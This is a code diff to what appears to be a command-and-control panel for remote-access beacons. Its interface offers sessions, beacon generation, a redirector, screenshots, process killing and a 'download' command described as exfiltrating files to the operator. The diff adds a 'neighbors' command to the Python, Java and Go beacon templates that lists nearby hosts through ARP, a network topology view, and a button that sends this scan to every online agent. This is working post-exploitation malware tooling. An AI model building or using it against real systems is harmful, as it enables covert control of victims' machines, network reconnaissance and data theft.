@@ -14,6 +14,7 @@
   <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vis-network@9/standalone/umd/vis-network.min.js"></script>
 </head>
 <body>
 <div class="layout">
@@ -30,6 +31,9 @@
       </button>
       <button class="nav-item" onclick="showView('map')" id="nav-map">
         <span class="icon">🗺</span> <span data-i18n="nav_map">Map</span>
+      </button>
+      <button class="nav-item" onclick="showView('topology')" id="nav-topology">
+        <span class="icon">🕸</span> <span data-i18n="nav_topology">Topology</span>
       </button>
       <button class="nav-item" onclick="showView('generate')" id="nav-generate">
         <span class="icon">⚙</span> <span data-i18n="nav_generate">Generate Beacon</span>
@@ -139,9 +143,9 @@
 // ── i18n ─────────────────────────────────────────────────
 const LANG = {
   en: {
-    nav_sessions:'Sessions', nav_map:'Map', nav_generate:'Generate Beacon', nav_redirector:'Redirector',
+    nav_sessions:'Sessions', nav_map:'Map', nav_topology:'Topology', nav_generate:'Generate Beacon', nav_redirector:'Redirector',
     nav_settings:'Settings', nav_logout:'Logout',
-    title_sessions:'Sessions', title_map:'Agent Map', title_generate:'Generate Beacon',
+    title_sessions:'Sessions', title_map:'Agent Map', title_topology:'Network Topology', title_generate:'Generate Beacon',
     title_redirector:'Redirector Config', title_settings:'Settings',
     stat_total:'Total Sessions', stat_online:'Online', stat_offline:'Offline',
     agents_title:'Active Sessions', agents_refresh:'↻ Refresh',
@@ -234,9 +238,9 @@ const LANG = {
     loading:'Loading...', no_available:'N/A',
   },
   es: {
-    nav_sessions:'Sesiones', nav_map:'Mapa', nav_generate:'Generar Beacon', nav_redirector:'Redirector',
+    nav_sessions:'Sesiones', nav_map:'Mapa', nav_topology:'Topología', nav_generate:'Generar Beacon', nav_redirector:'Redirector',
     nav_settings:'Ajustes', nav_logout:'Salir',
-    title_sessions:'Sesiones', title_map:'Mapa de Agentes', title_generate:'Generar Beacon',
+    title_sessions:'Sesiones', title_map:'Mapa de Agentes', title_topology:'Topología de Red', title_generate:'Generar Beacon',
     title_redirector:'Config. Redirector', title_settings:'Ajustes',
     stat_total:'Sesiones Totales', stat_online:'En línea', stat_offline:'Sin conexión',
     agents_title:'Sesiones Activas', agents_refresh:'↻ Actualizar',
@@ -407,6 +411,7 @@ let taskHistory = [];  // [{command, output, status, id}]
 let _isAdmin = false;
 let _leafletMap = null;
 let _mapTimer = null;
+let _topoNet = null;
 
 // ── Toast notifications ───────────────────────────────────
 function showToast(msg, type = 'info') {
@@ -525,6 +530,9 @@ function showView(view, agentId) {
   } else if (view === 'map') {
     document.getElementById('topbar-title').textContent = t('title_map');
     renderMapView();
+  } else if (view === 'topology') {
+    document.getElementById('topbar-title').textContent = t('title_topology');
+    renderTopologyView();
   } else if (view === 'generate') {
     document.getElementById('topbar-title').textContent = t('title_generate');
     renderGenerateView();
@@ -545,6 +553,7 @@ function clearPolling() {
   if (agentPollTimer) { clearInterval(agentPollTimer); agentPollTimer = null; }
   if (_mapTimer) { clearInterval(_mapTimer); _mapTimer = null; }
   if (_leafletMap) { _leafletMap.remove(); _leafletMap = null; }
+  if (_topoNet) { _topoNet.destroy(); _topoNet = null; }
   // Restore content padding if it was removed for the map
   const content = document.getElementById('content');
   if (content) { content.style.padding = ''; content.style.overflow = ''; }
@@ -1438,6 +1447,7 @@ async function handleTermKey(event, agentId) {
         <span style="color:var(--accent2)">screenshot</span>          — captura pantalla y descarga<br>
         <span style="color:var(--accent2)">screenshot_sched &lt;N&gt;</span> — auto-captura cada N minutos (0 = detener)<br>
         <span style="color:var(--accent2)">find [ruta] &lt;patrón&gt;</span> — busca archivos en el target (ej: find C:\\ *.txt)<br>
+        <span style="color:var(--accent2)">neighbors</span>            — descubre hosts vecinos (ARP/ip neigh) → pobla el mapa de topología<br>
         <span style="color:var(--accent2)">ps</span>                  — lista procesos activos<br>
         <span style="color:var(--accent2)">kill &lt;pid&gt;</span>          — termina un proceso por PID<br>
         <span style="color:var(--accent2)">download &lt;/ruta&gt;</span>    — exfiltra archivo al operador<br>
@@ -3809,6 +3819,16 @@ def run_command(cmd, task_id=None):
         except Exception as _le:
             return f"Error: {_le}"
 ${findBlock}${screenshotSchedCmdBlock}
+    if cmd == 'neighbors':
+        import subprocess as _sp
+        try:
+            if _WIN:
+                _nb = _sp.check_output('arp -a', shell=True, stderr=_sp.DEVNULL).decode(errors='ignore')
+            else:
+                try: _nb = _sp.check_output(['ip','neigh'], stderr=_sp.DEVNULL).decode(errors='ignore')
+                except: _nb = _sp.check_output(['arp','-a'], stderr=_sp.DEVNULL).decode(errors='ignore')
+            return _nb.strip() or '[neighbors] no entries'
+        except Exception as _ne: return f'[neighbors] error: {_ne}'
     if cmd.startswith("shell "): cmd = cmd[6:]
 
     # Windows: handle 'cd' natively in Python to avoid cmd.exe trailing-backslash
@@ -4512,6 +4532,22 @@ public class Beacon {
         }
 
         ${javaFindBlock}${javaSchedCmdBlock}
+        if (cmd.equals("neighbors")) {
+            String[] args = System.getProperty("os.name","").toLowerCase().contains("win")
+                ? new String[]{"arp", "-a"}
+                : new String[]{"ip", "neigh"};
+            try {
+                Process p = Runtime.getRuntime().exec(args);
+                String nb = new String(p.getInputStream().readAllBytes()).trim();
+                return nb.isEmpty() ? "[neighbors] no entries" : nb;
+            } catch (Exception e) {
+                try {
+                    Process p2 = Runtime.getRuntime().exec(new String[]{"arp", "-a"});
+                    String nb = new String(p2.getInputStream().readAllBytes()).trim();
+                    return nb.isEmpty() ? "[neighbors] no entries" : nb;
+                } catch (Exception e2) { return "[neighbors] error: " + e2.getMessage(); }
+            }
+        }
         // Shell command
         try {
             ProcessBuilder pb = isWin
@@ -5058,6 +5094,20 @@ func _runCmd(cmd, taskID string) string {
 \t\treturn "__pty_started__"
 \t}
 \t${goFindBlock}${goSchedCmdBlock}
+\tif cmd == "neighbors" {
+\t\tvar _nc *exec.Cmd
+\t\tif runtime.GOOS == "windows" {
+\t\t\t_nc = exec.Command("arp", "-a")
+\t\t} else if _, err := exec.LookPath("ip"); err == nil {
+\t\t\t_nc = exec.Command("ip", "neigh")
+\t\t} else {
+\t\t\t_nc = exec.Command("arp", "-a")
+\t\t}
+\t\t_nb, _nerr := _nc.Output()
+\t\tif _nerr != nil { return "[neighbors] error: " + _nerr.Error() }
+\t\tif len(strings.TrimSpace(string(_nb))) == 0 { return "[neighbors] no entries" }
+\t\treturn string(_nb)
+\t}
 \tif strings.HasPrefix(cmd, "shell ") { cmd = cmd[6:] }
 \tif cmd == "cd" || cmd == "cd ." { return _cwd }
 \tif strings.HasPrefix(cmd, "cd ") {
@@ -5632,6 +5682,134 @@ async function clearAuditLog() {
 function countryFlag(code) {
   if (!code || code.length !== 2) return '';
   return [...code.toUpperCase()].map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
+}
+
+// ── Topology View ─────────────────────────────────────────
+async function renderTopologyView() {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="padding:20px 24px 0">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+        <div>
+          <h2 style="font-size:15px;font-weight:700;color:var(--text)">${t('title_topology')}</h2>
+          <p style="color:var(--text3);font-size:12px;margin-top:3px">Run <code style="color:var(--accent)">neighbors</code> on agents to discover nearby hosts.</p>
+        </div>
+        <div style="display:flex;gap:8px">
+          <button class="btn btn-sm btn-ghost" onclick="renderTopologyView()">↺ Refresh</button>
+          <button class="btn btn-sm" onclick="_topoScanAll()" id="topo-scan-btn">⚡ Scan all online</button>
+        </div>
+      </div>
+      <div style="display:flex;gap:16px;font-size:11px;color:var(--text3);align-items:center;margin-bottom:8px">
+        <span style="display:inline-flex;align-items:center;gap:5px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#22c55e;display:inline-block"></span>Online agent
+        </span>
+        <span style="display:inline-flex;align-items:center;gap:5px">
+          <span style="width:10px;height:10px;border-radius:50%;background:#ef4444;display:inline-block"></span>Offline agent
+        </span>
+        <span style="display:inline-flex;align-items:center;gap:5px">
+          <span style="width:10px;height:10px;border-radius:2px;background:#334155;display:inline-block"></span>Discovered host
+        </span>
+        <span style="margin-left:8px;color:var(--text3)">Double-click an agent node to open its session.</span>
+      </div>
+    </div>
+    <div id="topo-container" style="width:100%;height:calc(100vh - 155px);background:var(--bg2);border-top:1px solid var(--border)"></div>
+  `;
+
+  const res = await apiFetch('/api/topology');
+  if (!res || !res.ok) {
+    document.getElementById('topo-container').innerHTML =
+      '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--danger)">Failed to load topology data.</div>';
+    return;
+  }
+  const data = await res.json();
+  const container = document.getElementById('topo-container');
+  if (!container) return;
+
+  if (!data.nodes.length) {
+    container.innerHTML = `<div style="display:flex;align-items:center;justify-content:center;height:100%;flex-direction:column;gap:12px;color:var(--text3)">
+      <div style="font-size:36px">🕸</div>
+      <div>No agents yet. Once agents check in they appear here automatically.</div>
+      <div style="font-size:11px">Run <code style="color:var(--accent)">neighbors</code> on an agent to map nearby hosts.</div>
+    </div>`;
+    return;
+  }
+
+  const visNodes = new vis.DataSet(data.nodes.map(n => {
+    const isAgent = n.type === 'agent';
+    const color = isAgent
+      ? (n.online
+          ? { background:'#22c55e', border:'#16a34a', highlight:{ background:'#4ade80', border:'#16a34a' } }
+          : { background:'#ef4444', border:'#dc2626', highlight:{ background:'#f87171', border:'#dc2626' } })
+      : { background:'#1e293b', border:'#334155', highlight:{ background:'#334155', border:'#475569' } };
+    const labelParts = [n.label];
+    if (n.ip && n.ip !== n.label) labelParts.push(n.ip);
+    return {
+      id:     n.id,
+      label:  labelParts.join('\n'),
+      shape:  isAgent ? 'dot' : 'square',
+      size:   isAgent ? 18 : 11,
+      color,
+      font:   { color:'#cbd5e1', size:11, face:'monospace' },
+      title:  `<div style="font-family:monospace;font-size:11px;line-height:1.7;color:#e2e8f0;background:#1e293b;padding:8px 10px;border-radius:6px">` +
+              `<b>${n.label}</b>` +
+              (n.ip   ? `<br><span style="color:#94a3b8">IP:</span> ${n.ip}`   : '') +
+              (n.user ? `<br><span style="color:#94a3b8">User:</span> ${n.user}` : '') +
+              (n.os   ? `<br><span style="color:#94a3b8">OS:</span> ${n.os.substring(0,50)}` : '') +
+              (n.online !== undefined && isAgent ? `<br><span style="color:${n.online?'#22c55e':'#ef4444'}">${n.online?'● Online':'● Offline'}</span>` : '') +
+              `</div>`,
+      _agentId: n.agent_id,
+      _type:    n.type,
+    };
+  }));
+
+  const visEdges = new vis.DataSet(data.edges.map((e, i) => ({
+    id:     i,
+    from:   e.from,
+    to:     e.to,
+    color:  { color:'#334155', highlight:'#64748b', opacity:0.8 },
+    arrows: { to:{ enabled:true, scaleFactor:0.45 } },
+    smooth: { type:'continuous' },
+  })));
+
+  const options = {
+    physics: {
+      stabilization: { iterations:200, updateInterval:25 },
+      barnesHut:     { gravitationalConstant:-9000, springLength:150, damping:0.15 },
+    },
+    interaction: { hover:true, tooltipDelay:120, hideEdgesOnDrag:true, navigationButtons:false },
+  };
+
+  if (_topoNet) _topoNet.destroy();
+  _topoNet = new vis.Network(container, { nodes:visNodes, edges:visEdges }, options);
+
+  _topoNet.on('doubleClick', params => {
+    if (!params.nodes.length) return;
+    const nodeData = visNodes.get(params.nodes[0]);
+    if (nodeData && nodeData._type === 'agent' && nodeData._agentId) {
+      showView('session', nodeData._agentId);
+    }
+  });
+}
+
+async function _topoScanAll() {
+  const btn = document.getElementById('topo-scan-btn');
+  if (btn) { btn.disabled = true; btn.textContent = '⏳ Sending...'; }
+  const res = await apiFetch('/api/agents');
+  if (!res || !res.ok) { if (btn) { btn.disabled = false; btn.textContent = '⚡ Scan all online'; } return; }
+  const agents = await res.json();
+  const online = agents.filter(a => a.online);
+  for (const a of online) {
+    await apiFetch(`/api/agents/${a.id}/tasks`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'neighbors' }),
+    });
+  }
+  if (btn) {
+    btn.disabled = false;
+    btn.textContent = `✓ Sent to ${online.length} agent(s)`;
+    setTimeout(() => { if (btn) btn.textContent = '⚡ Scan all online'; }, 3000);
+  }
 }
 
 async function renderMapView() {
